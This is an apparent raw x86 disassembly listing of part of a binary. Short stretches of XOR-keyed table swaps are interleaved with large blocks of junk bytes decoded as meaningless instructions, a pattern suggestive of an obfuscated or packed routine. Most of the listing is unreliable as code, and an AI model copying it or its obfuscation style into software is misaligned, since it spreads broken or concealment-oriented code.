  4049f7:	push   cs
  4049f8:	pcmpeqb mm5,QWORD PTR ds:0x2b86efc9
  4049ff:	pushf  
  404a00:	dec    eax
  404a01:	cmc    
  404a02:	cmp    ebx,DWORD PTR [edi+0x2c]
  404a05:	xor    eax,DWORD PTR [edi-0x7ab3667c]
  404a0b:	pop    edi
  404a0c:	pop    es
  404a0d:	shl    DWORD PTR [ebp+0x3b],cl
  404a10:	arpl   WORD PTR [edi],bp
  404a12:	loope  0x4049ef
  404a14:	out    dx,al
  404a15:	mov    edx,0x5db4baf1
  404a1a:	iret   
  404a1b:	sub    dl,BYTE PTR [ebx-0x35481b48]
  404a21:	xlat   BYTE PTR ds:[ebx]
  404a22:	sub    al,0x89
  404a24:	or     ecx,DWORD PTR [ecx-0x5046bf91]
  404a2a:	mov    dh,0x47
  404a2c:	jne    0x404a91
  404a2e:	(bad)  
  404a30:	retf   
  404a31:	mov    al,0x12
  404a33:	outs   dx,BYTE PTR ds:[esi]
  404a34:	loop   0x404a3a
  404a36:	ins    DWORD PTR es:[edi],dx
  404a37:	mov    dl,0x51
  404a39:	pop    ebp
  404a3a:	or     cl,BYTE PTR [ebp-0x2bfb42a1]
  404a40:	addr16 aam 0x3d
  404a43:	movhps QWORD PTR [edx],xmm6
  404a46:	dec    edi
  404a47:	sub    DWORD PTR [ecx+0x1ac2d947],edx
  404a4d:	mov    edx,0xbc215122
  404a52:	aas    
  404a53:	mov    BYTE PTR [edx-0x2d],al
  404a56:	sbb    DWORD PTR [edx+eax*4-0x27],eax
  404a5a:	mov    al,ds:0xc0d4999a
  404a5f:	pop    ebp
  404a60:	or     DWORD PTR [ebx+0x6d7f843c],ecx
  404a66:	das    
  404a67:	mov    WORD PTR [edx+0x1ce7a701],?
  404a6d:	cdq    
  404a6e:	inc    esi
  404a6f:	arpl   WORD PTR [eax-0x78197b8b],cx
  404a75:	push   ebx
  404a76:	mov    al,0x6d
  404a78:	scas   al,BYTE PTR es:[edi]
  404a79:	jle    0x404a78
  404a7b:	repnz add al,0xd9
  404a7e:	fldenv [ebx-0x28]
  404a81:	jmp    0x5ff6e5ca
  404a86:	jb     0x404ad2
  404a88:	dec    eax
  404a89:	xchg   esp,eax
  404a8a:	retf   0x72ae
  404a8d:	addr16 jae 0x404a64
  404a90:	mov    bl,0x29
  404a92:	or     BYTE PTR [ecx],0x88
  404a95:	aas    
  404a96:	push   cs
  404a97:	call   0x3327:0xd223725e
  404a9e:	ja     0x404a3f
  404aa0:	call   0xc764:0xd2a2fbb5
  404aa7:	inc    ebp
  404aa8:	hlt    
  404aa9:	xor    al,BYTE PTR [ebp+0x45c7f89c]
  404aaf:	mov    esp,0xf89c8533
  404ab4:	mov    edx,DWORD PTR [ebp-0x18]
  404ab7:	xor    edx,eax
  404ab9:	add    edx,ecx
  404abb:	jmp    0x404e2b
  404ac0:	mov    edx,DWORD PTR [ebp-0x18]
  404ac3:	xor    edx,eax
  404ac5:	add    edx,DWORD PTR [ebp-0x14]
  404ac8:	mov    edi,DWORD PTR [ebp-0x1c]
  404acb:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ad2:	mov    BYTE PTR [ebp+0xf],dl
  404ad5:	mov    edx,DWORD PTR [ebp-0xc]
  404ad8:	xor    edx,eax
  404ada:	add    edx,DWORD PTR [ebp-0x14]
  404add:	mov    edi,DWORD PTR [ebp-0x1c]
  404ae0:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  404ae7:	mov    BYTE PTR [ebp+0xb],dl
  404aea:	mov    dl,BYTE PTR [ebp+0xf]
  404aed:	mov    edi,DWORD PTR [ebp-0xc]
  404af0:	xor    edi,eax
  404af2:	add    edi,DWORD PTR [ebp-0x14]
  404af5:	mov    ebx,DWORD PTR [ebp-0x1c]
  404af8:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404aff:	mov    dl,BYTE PTR [ebp+0xb]
  404b02:	mov    edi,DWORD PTR [ebp-0x18]
  404b05:	xor    edi,eax
  404b07:	add    edi,DWORD PTR [ebp-0x14]
  404b0a:	mov    ebx,DWORD PTR [ebp-0x1c]
  404b0d:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  404b14:	mov    edx,DWORD PTR [ebp-0x44]
  404b17:	mov    edi,DWORD PTR [ebp-0xc]
  404b1a:	xor    edx,eax
  404b1c:	xor    edi,eax
  404b1e:	add    edx,ecx
  404b20:	jmp    0x404e23
  404b25:	xor    ebx,esi
  404b27:	adc    edx,ebp
  404b29:	shl    ebp,1
  404b2b:	icebp  
  404b2c:	repz xor eax,0x563c6a28
  404b32:	mov    ch,ch
  404b34:	mov    fs:0x587e7e22,al
  404b3a:	jl     0x404bba
  404b3c:	jle    0x404b75
  404b3e:	gs inc ebp
  404b40:	sbb    esp,eax
  404b42:	mov    bh,BYTE PTR [esi]
  404b44:	adc    eax,0xb62e4f65
  404b49:	or     ch,0x20
  404b4c:	push   ebp
  404b4d:	div    DWORD PTR [edi]
  404b4f:	je     0x404bb6
  404b51:	adc    dh,BYTE PTR [ecx]
  404b53:	jnp    0x404adf
  404b55:	jnp    0x404b3d
  404b57:	adc    esi,DWORD PTR [esp+ecx*1+0x3]
  404b5b:	mov    dh,0x6b
  404b5d:	test   DWORD PTR [edx],edi
  404b5f:	ins    BYTE PTR es:[edi],dx
  404b60:	dec    ebp
  404b61:	(bad)  
  404b63:	mov    edx,0x7eec0e9e
  404b68:	inc    edx
  404b69:	lds    eax,FWORD PTR [edi+eax*1]
  404b6c:	cld    
  404b6d:	adc    eax,0xa4f9587b
  404b72:	pop    ss
  404b73:	xor    bl,BYTE PTR [esi]
  404b75:	fisub  WORD PTR [esi+0x18]
  404b78:	xchg   DWORD PTR [ebx+edx*2-0x6db6a92c],esp
  404b7f:	fimul  WORD PTR [eax+0x4d]
  404b82:	sub    eax,0x1e2db29a
  404b87:	into   
  404b88:	fcom   DWORD PTR [eax]
  404b8a:	pop    es
  404b8b:	xchg   edx,eax
  404b8c:	push   es
  404b8d:	mov    esp,DWORD PTR [ebx]
  404b8f:	cmovle ebp,DWORD PTR [esi+0x1a21d474]
  404b96:	xchg   edx,eax
  404b97:	ins    BYTE PTR es:[edi],dx
  404b98:	cwde   
  404b99:	ss rol edx,cl
  404b9c:	mov    esi,0x2b855083
  404ba1:	(bad)  
  404ba2:	retf   
  404ba3:	dec    esp
  404ba4:	jns    0x404b6c
  404ba6:	call   0x528c22c
  404bab:	out    dx,al
  404bac:	mov    eax,ds:0x824c8323
  404bb1:	nop
  404bb2:	mov    al,0xae
  404bb4:	adc    ecx,ecx
  404bb6:	mov    gs,WORD PTR [ecx-0x1a3959e8]
  404bbc:	jno    0x404c2e
  404bbe:	sub    ecx,DWORD PTR [edi-0x401f3841]
  404bc4:	sub    esi,DWORD PTR [esi-0x63]
  404bc7:	test   DWORD PTR [ebp-0x27],esp
  404bca:	xor    ebp,0x9fee9136
  404bd0:	or     eax,0x169907ee
  404bd5:	pop    edi
  404bd6:	push   ebx
  404bd7:	aas    
  404bd8:	cdq    
  404bd9:	adc    eax,0xbb01b31c
  404bde:	push   edx
  404bdf:	cdq    
  404be0:	inc    esi
  404be1:	cdq    
  404be2:	out    0xea,al
  404be4:	leave  
  404be5:	loop   0x404ba0
  404be7:	out    dx,al
  404be8:	outs   dx,DWORD PTR ds:[esi]
  404be9:	(bad)  
  404bea:	mov    dh,0x2e
  404bec:	fisub  WORD PTR [ebx]
  404bee:	xchg   ebp,eax
  404bef:	mov    ecx,0x707a15e3
  404bf4:	jecxz  0x404c05
  404bf6:	les    esp,FWORD PTR [ebx+0x3520f47e]
  404bfc:	lea    esp,ds:0xa4631172
  404c02:	xchg   ecx,eax
  404c03:	rcr    DWORD PTR [edi+0x4895b5c4],1
  404c09:	pop    esp
  404c0a:	ins    DWORD PTR es:[edi],dx
  404c0b:	data16 lock xor BYTE PTR [ebx-0x4908a822],0xd9
  404c14:	loop   0x404c56
  404c16:	adc    eax,edi
  404c18:	inc    ecx
  404c19:	in     eax,dx
  404c1a:	sub    bh,BYTE PTR [ecx]
  404c1c:	cmp    eax,0xea77b98c
  404c21:	or     DWORD PTR [ecx-0x680e867a],esi
  404c27:	outs   dx,BYTE PTR ds:[esi]
  404c28:	and    BYTE PTR [eax+edx*8-0x14b52843],dl
  404c2f:	adc    al,0x33
  404c31:	movzx  edi,dh
  404c34:	xchg   ecx,eax
  404c35:	shl    BYTE PTR [ebp+ebp*1-0x7efb2bd5],1
  404c3c:	adc    DWORD PTR [edi],ecx
  404c3e:	mov    bh,0x28
  404c40:	ds pop ebx
  404c42:	add    esp,DWORD PTR [ebx]
  404c44:	popf   
  404c45:	sub    dh,BYTE PTR [esp+edi*8+0x17]
  404c49:	les    edx,FWORD PTR [esi+0x48858cac]
  404c4f:	fdiv   QWORD PTR [ebx+ebx*8+0x6f]
  404c53:	mov    edx,DWORD PTR [esi-0x3f]
  404c56:	and    al,0xa1
  404c58:	(bad)  
  404c5a:	cmc    
  404c5b:	fs ja  0x404ca0
  404c5e:	loopne 0x404c94
  404c60:	pop    edx
  404c61:	cmp    DWORD PTR [esi+eiz*8+0x4af0467f],eax
  404c68:	push   ecx
  404c69:	(bad)  
  404c6a:	fst    QWORD PTR [esi]
  404c6c:	fadd   st(6),st
  404c6e:	push   edi
  404c6f:	jmp    DWORD PTR [ebp+0x31]
  404c72:	mov    esp,0xf893059
  404c77:	push   ecx
  404c78:	dec    ebx
  404c79:	xor    bl,BYTE PTR [edx+0x224d6d2e]
  404c7f:	add    edi,DWORD PTR [edi]
  404c81:	xor    al,0x8b
  404c83:	dec    ebx
  404c84:	inc    esp
  404c85:	cwde   
  404c86:	adc    ecx,DWORD PTR [ebp+eiz*2+0x1da7243b]
  404c8d:	adc    BYTE PTR [edx+ebp*1],dl
  404c90:	out    0x1,al
  404c92:	push   ebp
  404c93:	xlat   BYTE PTR ds:[ebx]
  404c94:	loope  0x404c21
  404c96:	or     al,0x8
  404c98:	mov    ds:0xfd3e55cc,eax
  404c9d:	push   edi
  404c9e:	in     eax,0x31
  404ca0:	sub    DWORD PTR [ecx],eax
  404ca2:	nop
  404ca3:	aam    0xda
  404ca5:	in     eax,dx
  404ca6:	shl    BYTE PTR [ebx+0x20],cl
  404ca9:	fnsave [edi-0xb]
  404cac:	lods   eax,DWORD PTR ds:[esi]
  404cad:	ror    BYTE PTR [ebp-0x210c7e3],cl
  404cb3:	mov    esp,0x702dd5ab
  404cb8:	mov    edx,0x8bc60e45
  404cbd:	jl     0x404cf7
  404cbf:	xchg   ebx,eax
  404cc0:	push   cs
  404cc1:	js     0x404c4c
  404cc3:	sub    DWORD PTR [ebx],0x28
  404cc6:	push   ds
  404cc7:	in     eax,dx
  404cc8:	test   BYTE PTR [ebx],cl
  404cca:	jge    0x404d22
  404ccc:	pop    edi
  404ccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cce:	pop    ebx
  404ccf:	loope  0x404d25
  404cd1:	sub    ebx,DWORD PTR [esi+0x68]
  404cd4:	imul   ebx,DWORD PTR [edi-0x6570d653],0x3f
  404cdb:	xor    esp,DWORD PTR [ecx]
  404cdd:	gs add al,0xbf
  404ce0:	(bad)  
  404ce1:	fisubr WORD PTR [edi+0x6df88cef]
  404ce7:	int3   
  404ce8:	aas    
  404ce9:	iret   
  404cea:	fwait
  404ceb:	inc    ebp
  404cec:	sub    esp,DWORD PTR [esi-0x5f652510]
  404cf2:	dec    ebp
  404cf3:	inc    ecx
  404cf4:	shl    BYTE PTR [eax],cl
  404cf6:	add    DWORD PTR [ebp-0x54f7de27],esp
  404cfc:	sar    bl,cl
  404cfe:	pop    es
  404cff:	jns    0x404cdb
  404d01:	xor    dh,BYTE PTR [eax+0x46d3109b]
  404d07:	daa    
  404d08:	cmp    ch,BYTE PTR [ebx-0x72]
  404d0b:	push   esi
  404d0c:	loopne 0x404d33
  404d0e:	popf   
  404d0f:	std    
  404d10:	pushf  
  404d11:	outs   dx,DWORD PTR ds:[esi]
  404d12:	je     0x404ca5
  404d14:	add    BYTE PTR [eax-0x7b2cc0a7],dl
  404d1a:	cmp    ecx,DWORD PTR [edx]
  404d1c:	push   esi
  404d1d:	in     al,dx
  404d1e:	jl     0x404cd3
  404d20:	inc    edx
  404d21:	nop
  404d22:	cmp    DWORD PTR [ebp+edi*1-0x4bdbce4c],ecx
  404d29:	adc    BYTE PTR [ebp-0x3069ed42],dh
  404d2f:	xor    DWORD PTR [edx+eax*2-0x24],esi
  404d33:	adc    eax,0xe8156c1c
  404d38:	(bad)  [esi+0xb]
  404d3b:	fs xchg ah,cl
  404d3e:	jle    0x404d7a
  404d40:	push   cs
  404d41:	into   
  404d42:	add    ecx,DWORD PTR [edi+edi*2+0x43]
  404d46:	mov    bh,BYTE PTR [esp+ebp*1]
  404d49:	retf   
  404d4a:	dec    BYTE PTR [edx-0x2e]
  404d4d:	and    eax,0x75fa9afc
  404d52:	jecxz  0x404d9b
  404d54:	xor    DWORD PTR [ecx],ebp
  404d56:	adc    al,0x3f
  404d58:	bound  ebx,QWORD PTR [eax-0x5a]
  404d5b:	in     al,dx
  404d5c:	vpaddw xmm2,xmm7,xmm1
  404d60:	and    BYTE PTR [ebp-0x7ddd37a5],bl
  404d66:	add    BYTE PTR [ebx-0x44a94db8],0xf
  404d6d:	xchg   edi,eax
  404d6e:	sub    eax,0x482092e
  404d73:	push   edi
  404d74:	sbb    eax,0x37daa700
  404d79:	mov    eax,ds:0x676c0e85
  404d7e:	out    0x5e,eax
  404d80:	inc    esp
  404d81:	push   ss
  404d82:	add    ebx,DWORD PTR [esi-0x527386d0]
  404d88:	and    esi,DWORD PTR [ebx+0x1b]
  404d8b:	in     eax,0x5c
  404d8d:	cmc    
  404d8e:	pop    ebx
  404d8f:	push   ebx
  404d90:	xchg   dh,ah
  404d92:	dec    esi
  404d93:	sub    DWORD PTR [edi+0x2aa2dd18],edi
  404d99:	lea    esi,[edi]
  404d9b:	gs aam 0xc6
  404d9e:	cmp    eax,0xa53d4040
  404da3:	xchg   edi,eax
  404da4:	cmp    eax,0x507e1b2e
  404da9:	add    ebp,ebx
  404dab:	ins    BYTE PTR es:[edi],dx
  404dac:	(bad)  
  404dae:	or     DWORD PTR ds:0x1fcab262,esi
  404db4:	cmp    al,0xb0
  404db6:	xchg   ebp,edx
  404db8:	jp     0x404d41
  404dba:	xor    BYTE PTR [edi+0x5e3923ac],al
  404dc0:	xor    DWORD PTR [ebp+0xd],ebx
  404dc3:	add    ebx,DWORD PTR [eax+0x5c01e5ae]
  404dc9:	pusha  
  404dca:	push   ds
  404dcb:	leave  
  404dcc:	xor    edx,DWORD PTR [ebx]
  404dce:	sub    esi,DWORD PTR [eax-0x29]
  404dd1:	ret    0x55cc
  404dd4:	or     eax,0x26aee773
  404dd9:	inc    edi
  404dda:	jnp    0x404d83
  404ddc:	inc    ebx
  404ddd:	(bad)  
  404ddf:	or     al,al
  404de1:	dec    ecx
  404de2:	mul    BYTE PTR [ebx-0x4b]
  404de5:	inc    esp
  404de6:	in     al,0x5d
  404de8:	repz out 0x53,eax
  404deb:	xchg   esp,eax
  404dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ded:	jge    0x404dd3
  404def:	sub    BYTE PTR [ecx],0x1e
  404df2:	lods   al,BYTE PTR ds:[esi]
  404df3:	gs in  al,0x11
  404df6:	fsub   QWORD PTR [ebx+ebp*8+0x7d]
  404dfa:	mov    al,ds:0x4402bcf0
  404dff:	add    eax,0x857b490c
  404e04:	ror    BYTE PTR [esp+eiz*2-0x51],cl
  404e08:	dec    eax
  404e09:	push   eax
  404e0a:	std    
  404e0b:	inc    DWORD PTR [ecx-0x4c]
  404e0e:	fcomp  DWORD PTR [ecx+edi*4+0xec87c9d]
  404e15:	inc    ecx
  404e16:	mov    al,ds:0xbe5e9ac6
  404e1b:	ja     0x404da4
  404e1d:	xchg   ecx,eax
  404e1e:	shl    edi,1
  404e20:	xor    DWORD PTR [eax-0x58],edi
  404e23:	add    edi,ecx
  404e25:	imul   edx,edi
  404e28:	add    edx,DWORD PTR [ebp-0x14]
  404e2b:	mov    DWORD PTR [ebp-0x14],edx
  404e2e:	mov    edx,DWORD PTR [ebp-0xc]
  404e31:	mov    edi,DWORD PTR [ebp-0x24]
  404e34:	xor    edx,eax
  404e36:	add    edx,ecx
  404e38:	imul   edx,edi
  404e3b:	mov    edi,DWORD PTR [ebp-0xc]
  404e3e:	xor    edi,eax
  404e40:	sub    edx,edi
  404e42:	mov    edi,DWORD PTR [ebp-0xc]
  404e45:	mov    ebx,DWORD PTR [ebp-0x14]
  404e48:	xor    edi,eax
  404e4a:	add    edi,ecx
  404e4c:	jmp    0x40514f
  404e51:	xlat   BYTE PTR ds:[ebx]
  404e52:	pop    eax
  404e53:	mov    ds:0x51e5b1dc,eax
  404e58:	jno    0x404e33
  404e5a:	stc    
  404e5b:	hlt    
  404e5c:	jb     0x404eaa
  404e5e:	hlt    
  404e5f:	inc    eax
  404e60:	sub    DWORD PTR [ecx+eiz*1+0x7c587e7e],ecx
  404e67:	jle    0x404ee7
  404e69:	lock popf 
  404e6b:	xor    DWORD PTR [edi+0x1f],0x2a2cbdd2
  404e72:	out    dx,eax
  404e73:	push   ds
  404e74:	je     0x404ef5
  404e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e77:	add    eax,0x16086ed8
  404e7c:	je     0x404e69
  404e7e:	mul    DWORD PTR [ecx+0x65e31d08]
  404e84:	enter  0x208f,0x1a
  404e88:	jnp    0x404e9b
  404e8a:	add    edi,ebx
  404e8c:	mov    dl,BYTE PTR [ecx]
  404e8e:	inc    esi
  404e8f:	in     al,0x5c
  404e91:	test   DWORD PTR [eax+edi*4],0x33b9b695
  404e98:	cwde   
  404e99:	sbb    al,0xab
  404e9b:	cli    
  404e9c:	clc    
  404e9d:	je     0x404f01
  404e9f:	mov    BYTE PTR [ebx],ah
  404ea1:	dec    edx
  404ea2:	test   BYTE PTR [edi+ebp*1-0x16dd3afd],dh
  404ea9:	cmp    dh,BYTE PTR [esp+edi*1-0x67]
  404ead:	(bad)  
  404eae:	clc    
  404eaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eb0:	adc    esi,ebx
  404eb2:	pop    esi
  404eb3:	pushf  
  404eb4:	int    0xaa
  404eb6:	scas   eax,DWORD PTR es:[edi]
  404eb7:	mov    ds:0xb9bf921d,al
  404ebc:	inc    esp
  404ebd:	(bad)  
  404ebe:	popa   
  404ebf:	mov    es,WORD PTR [edx-0x5ebe38a0]
  404ec5:	lods   eax,DWORD PTR ds:[esi]
  404ec6:	arpl   WORD PTR [edi],dx
  404ec8:	jno    0x404e90
  404eca:	mov    ds:0x3b08e2f5,eax
  404ecf:	(bad)  
  404ed0:	mov    dh,0x73
  404ed2:	sar    ebx,cl
  404ed4:	and    al,0x6b
  404ed6:	repz sbb DWORD PTR [ecx],esi
  404ed9:	ret    0xa32d
  404edc:	mov    WORD PTR [ecx],?
  404ede:	retf   0x391d
  404ee1:	mov    ds:0x36c79258,eax
  404ee6:	mov    dl,0x93
  404ee8:	dec    edx
  404ee9:	jne    0x404f43
  404eeb:	loopne 0x404ec3
  404eed:	(bad)  
  404eee:	out    dx,eax
  404eef:	sbb    bl,ah
  404ef1:	xchg   DWORD PTR [ecx+0xd],edi
  404ef4:	cmp    eax,0xef64294e
  404ef9:	mov    ds:0x3a1f108d,eax
  404efe:	jl     0x404f5d
  404f00:	inc    esp
  404f01:	and    esi,ebx
  404f03:	les    ecx,FWORD PTR [ebx+0x19]
  404f06:	jbe    0x404ef8
  404f08:	mov    DWORD PTR [ecx-0x7ef40573],edx
  404f0e:	inc    esi
  404f0f:	jle    0x404f6d
  404f11:	sbb    al,0xee
  404f13:	out    dx,al
  404f14:	xor    cl,BYTE PTR [esi-0x2893e40d]
  404f1a:	data16 loop 0x404f2e
  404f1d:	mov    WORD PTR [edi],ss
  404f1f:	in     eax,dx
  404f20:	sbb    al,0x98
  404f22:	push   0x17
  404f24:	inc    eax
  404f25:	ret    
  404f26:	push   ss
  404f27:	mov    ch,0xaa
  404f29:	or     eax,0x813f8736
  404f2e:	adc    esi,ebx
  404f30:	data16 arpl cx,si
  404f33:	cmp    esp,DWORD PTR [esi]
  404f35:	pop    ecx
  404f36:	mov    eax,0x69ea0f9d
  404f3b:	lods   eax,DWORD PTR ds:[esi]
  404f3c:	lahf   
  404f3d:	jnp    0x404f96
  404f3f:	bound  eax,QWORD PTR [ecx-0x518fce84]
  404f45:	ins    DWORD PTR es:[edi],dx
  404f46:	inc    esi
  404f47:	jnp    0x404f98
  404f49:	dec    ebx
  404f4a:	lock dec ebx
  404f4c:	ja     0x404fc7
  404f4e:	sbb    DWORD PTR [eax],esi
  404f50:	shl    ebp,1
  404f52:	and    BYTE PTR [edx+0x17934211],0x86
  404f59:	pop    DWORD PTR [edi+0x40072830]
  404f5f:	mov    ds:0x78145b6c,al
  404f64:	daa    
  404f65:	mov    dl,0x42
  404f67:	cld    
  404f68:	push   ecx
  404f69:	cmp    al,0xd3
  404f6b:	mov    ah,0x69
  404f6d:	fadd   DWORD PTR [ebx+0x50]
  404f70:	inc    esi
  404f71:	xchg   edx,eax
  404f72:	xchg   DWORD PTR [ebp-0x33],esi
  404f75:	push   edx
  404f76:	mov    cl,0x84
  404f78:	pushf  
  404f79:	sbb    dh,0x6a
  404f7c:	mov    esp,ebp
  404f7e:	out    dx,al
  404f7f:	aas    
  404f80:	pop    es
  404f81:	dec    ebx
  404f82:	ins    DWORD PTR es:[edi],dx
  404f83:	pop    edx
  404f84:	mov    ebx,DWORD PTR [edx+0xe2e7a71]
  404f8a:	daa    
  404f8b:	retf   
  404f8c:	jmp    0x404fc6
  404f8e:	jnp    0x404ff9
  404f90:	mov    ah,0x70
  404f92:	hlt    
  404f93:	fcomi  st,st(2)
  404f95:	daa    
  404f96:	in     al,dx
  404f97:	adc    al,0x53
  404f99:	xchg   ecx,eax
  404f9a:	lds    ebx,FWORD PTR [esi-0xc]
  404f9d:	pop    esi
  404f9e:	sbb    ebp,ebp
  404fa0:	enter  0xa1c5,0xfe
  404fa4:	sub    ecx,DWORD PTR [ecx+0x49]
  404fa7:	jp     0x404f97
  404fa9:	xchg   esi,eax
  404faa:	stos   DWORD PTR es:[edi],eax
  404fab:	push   edi
  404fac:	ja     0x404fe2
  404fae:	std    
  404faf:	rcr    DWORD PTR ss:[eax-0x5f511227],1
  404fb6:	xlat   BYTE PTR ds:[ebx]
  404fb7:	dec    edx
  404fb8:	dec    edi
  404fb9:	fsub   QWORD PTR [esi+0x39]
  404fbc:	or     al,0x7f
  404fbe:	cli    
  404fbf:	xchg   ebx,eax
  404fc0:	stos   DWORD PTR es:[edi],eax
  404fc1:	jmp    0x447:0x2cf89322
  404fc8:	lahf   
  404fc9:	(bad)  
  404fca:	(bad)  
  404fcc:	lock xchg ebx,eax
  404fce:	push   es
  404fcf:	jb     0x404fe3
  404fd1:	jno    0x404f6b
  404fd3:	popf   
  404fd4:	call   0xaa95:0xe759de80
  404fdb:	jg     0x404fd6
  404fdd:	mov    dh,0x25
  404fdf:	jg     0x404fa0
  404fe1:	and    ecx,ecx
  404fe3:	in     eax,0xc7
  404fe5:	or     al,0xf8
  404fe7:	cmp    esp,DWORD PTR [edi-0x24]
  404fea:	jp     0x404fd7
  404fec:	mov    dl,0x58
  404fee:	jmp    0xe596:0xf48239e0
  404ff5:	cli    
  404ff6:	mov    bl,0x6c
  404ff8:	or     eax,0xa81a8089
  404ffd:	cmp    al,bl
  404fff:	dec    BYTE PTR [esi+ebx*4+0x69]
  405003:	les    ebp,FWORD PTR [esi+0x30]
  405006:	ret    
  405007:	(bad)  
  405008:	out    0xcd,eax
  40500a:	ja     0x404fb8
  40500c:	sub    al,0x39
  40500e:	xor    BYTE PTR [esi+0x16a12384],dh
  405014:	leave  
  405015:	out    dx,al
  405016:	push   0xf93ef63e
  40501b:	push   ebx
  40501c:	mov    dh,0xf2
  40501e:	jle    0x404fbb
  405020:	mov    eax,ds:0xa432c42a
  405025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405026:	sbb    ah,BYTE PTR [ebp-0x43]
  405029:	cld    
  40502a:	call   esi
  40502c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40502d:	adc    eax,0x566276b1
  405032:	imul   ecx,DWORD PTR [edi],0xfffffff2
  405035:	or     eax,0xf0ea4872
  40503a:	lea    eax,[eax+0x24de7553]
  405040:	fcmovne st,st(0)
  405042:	xor    eax,0xb3b0664b
  405047:	or     BYTE PTR [edi-0x77],0x8d
  40504b:	ins    BYTE PTR es:[edi],dx
  40504c:	sub    al,0xd0
  40504e:	loop   0x405019
  405050:	aaa    
  405051:	data16 stos BYTE PTR es:[edi],al
  405053:	mov    dl,0x6c
  405055:	jle    0x404ffd
  405057:	pop    es
  405058:	xchg   ebx,eax
  405059:	and    eax,0x9e608823
  40505e:	pop    eax
  40505f:	(bad)  
  405060:	retf   0x349
  405063:	or     esp,ebp
  405065:	ja     0x40509e
  405067:	cmp    bh,BYTE PTR [ebx-0x6c]
  40506a:	test   BYTE PTR [ecx+ebx*1-0x2e],dl
  40506e:	ins    DWORD PTR es:[edi],dx
  40506f:	jb     0x4050a3
  405071:	sbb    cl,bh
  405073:	mov    esi,0xc99192b2
  405078:	je     0x4050c4
  40507a:	fstp   st(3)
  40507c:	push   esp
  40507d:	jp     0x405068
  40507f:	sub    eax,DWORD PTR [ebx+0x72b877a7]
  405085:	out    dx,al
  405086:	push   ebx
  405087:	push   edi
  405088:	push   esp
  405089:	(bad)  
  40508a:	in     al,0x9b
  40508c:	fidivr DWORD PTR [edi]
  40508e:	retf   0x1613
  405091:	jns    0x40506d
  405093:	sbb    dl,BYTE PTR [eax]
  405095:	xchg   esp,eax
  405096:	push   edx
  405097:	outs   dx,DWORD PTR ds:[esi]
  405098:	mov    DWORD PTR [edx-0x27abf8d3],ebp
  40509e:	mov    DWORD PTR [edi+0x7c],ebx
  4050a1:	xor    ecx,eax
  4050a3:	aas    
  4050a4:	cmp    ebx,DWORD PTR [ebp-0x29]
  4050a7:	mov    DWORD PTR [ebx-0x72],eax
  4050aa:	jmp    0x4050c2
  4050ac:	imul   eax,DWORD PTR [edi],0x5dcb2eac
  4050b2:	push   eax
  4050b3:	arpl   cx,ax
  4050b5:	mov    ebp,0x4c2376b2
  4050ba:	add    eax,0x33281cde
  4050bf:	push   esp
  4050c0:	cs ins DWORD PTR es:[edi],dx
  4050c2:	je     0x4050ae
  4050c4:	or     al,0x40
  4050c6:	mov    es,WORD PTR [ecx+0x3a]
  4050c9:	aas    
  4050ca:	sub    BYTE PTR [eax],dh
  4050cc:	jnp    0x405120
  4050ce:	scas   al,BYTE PTR es:[edi]
  4050cf:	imul   edi,DWORD PTR [ebx],0xffffff99
  4050d2:	lock pop ebx
  4050d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050d5:	out    dx,eax
  4050d6:	aam    0xfa
  4050d8:	sbb    BYTE PTR [eax+ebx*4+0x4e],0xdb
  4050dd:	repz aas 
  4050df:	test   BYTE PTR [esi],cl
  4050e1:	test   eax,0xbefa04
  4050e6:	ret    
  4050e7:	inc    DWORD PTR ds:0xe3a63f29
  4050ed:	add    ebp,ecx
  4050ef:	dec    esp
  4050f0:	sbb    edx,DWORD PTR [ecx-0x1e]
  4050f3:	or     al,0x7d
  4050f5:	sbb    eax,0x1c34be51
  4050fa:	mov    eax,0xab50aa61
  4050ff:	nop
  405100:	shr    BYTE PTR [edi-0x539f0e09],cl
  405106:	xchg   ecx,eax
  405107:	cwde   
  405108:	aas    
  405109:	xchg   edx,eax
  40510a:	sbb    ah,BYTE PTR [eax-0x7a8e0e15]
  405110:	pop    ebp
  405111:	shl    DWORD PTR [edi],1
  405113:	fld    QWORD PTR [ebx]
  405115:	jg     0x405135
  405117:	mov    ebp,0xe71c88d1
  40511c:	xchg   esi,ecx
  40511e:	imul   edx,DWORD PTR [esi],0x59
  405121:	dec    ebp
  405122:	xchg   esi,eax
  405123:	add    BYTE PTR [edx+0xe869d86],dh
  405129:	(bad)  
  40512b:	call   0x2ac2:0x9b54f9a8
  405132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405133:	adc    BYTE PTR [edx-0x64],cl
  405136:	adc    ch,cl
  405138:	mov    ds:0xf24c1c1,al
  40513d:	adc    DWORD PTR [eax-0x1b444d7],0x66
  405144:	jp     0x40515c
  405146:	lock push ds
  405148:	add    eax,0x2f267294
  40514d:	mov    ah,dl
  40514f:	imul   edi,ebx
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	jp     0x40515c
  405173:	data16 aad 0xf6
  405176:	sub    al,0x7e
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x405191
  40517e:	pop    edi
  40517f:	sub    DWORD PTR [esi],edx
  405181:	and    BYTE PTR [edi+0x18],0xb9
  405185:	outs   dx,BYTE PTR ds:[esi]
  405186:	sbb    al,0xfc
  405188:	cmc    
  405189:	jmp    0x4051bb
  40518b:	cmp    cl,BYTE PTR [ebx+0x48]
  40518e:	pop    ecx
  40518f:	ja     0x405132
  405191:	push   esi
  405192:	lods   eax,DWORD PTR ds:[esi]
  405193:	call   0x34943207
  405198:	imul   edi
  40519a:	mov    BYTE PTR [ebx],al
  40519c:	push   cs
